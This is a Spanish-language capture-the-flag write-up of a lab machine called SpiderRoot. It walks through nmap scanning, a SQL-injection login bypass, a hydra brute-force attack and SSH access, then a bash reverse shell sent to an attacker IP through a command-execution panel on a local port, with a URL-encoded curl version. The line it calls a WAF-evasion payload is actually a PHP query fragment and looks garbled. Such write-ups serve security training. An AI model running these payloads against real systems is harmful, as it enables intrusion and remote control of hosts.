<h2>Desplegamos el laboratorio spiderport.tar</h2>

<img width="1166" height="858" alt="1" src="../SpiderRoot/images/1.png" />

<h2>Realizamos un Reconocimiento de Nmap para conocer puertos abiertos y servicios activos</h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/2.png" />

<h2>El laboratorio tiene dos puertos en funcionamiento</h2>
<li>Puerto 22</li>
<li>Puerto 80</li>

<h2>Entramos a la aplicacion web y nos encontramos con lo siguiente.</h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/3.png" />

<h2>En la seleccion de Multiverso encontramos un panel de login por el cual intentaremos bypassear con el siguiente PAYLOAD</h2>
<h3> ' OR 1 = 1-- -</h3>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/5.png" />

<img width="1166" height="858" alt="1" src="../SpiderRoot/images/4.png" />
<h2>Vamos a intentar evadir el WAF con otros payloads el cual el que me funciono fue este: </h2>
<h3>` Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);</h3>

<br>

<h2>Ponemos el payload en el usuario y cualquier contraseña, y obtendremos las siguientes credenciales.</h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/6.png" />

<h2>Guardamos los usuarios y contraseñas en un archivo txt</h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/8.png" />


<h2>Realizamos un ataque de fuerza bruta con hydra y las credenciales correctas son estas: </h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/9.png" />



<h2>Entramos por SSH</h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/10.png" />


<h2>Visualizamos que puertos estan abiertos localmente y encontramos un servicio web en el puerto 8080</h2>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/11.png" />

<h2>Hacemos una peticion al servidor web local.</h2>
<h3>curl -s "http://127.0.0.1:8080"</h3>
<img width="1166" height="858" alt="1" src="../SpiderRoot/images/13.png" />

<h2>Encontramos un panel de ejecucion de comandos por la cual mandaremos una revere shell a nuestro equipo.</h2>
<h2 href="https://www.revshells.com/">Aqui puedes generar la reverse shell, RECUERDA PONER EN ENCODING URL DECODER</h2>
<h2>bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"</h2>
<h3>curl "http://127.0.0.1:8080/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F443%200%3E%261%22"</h3>



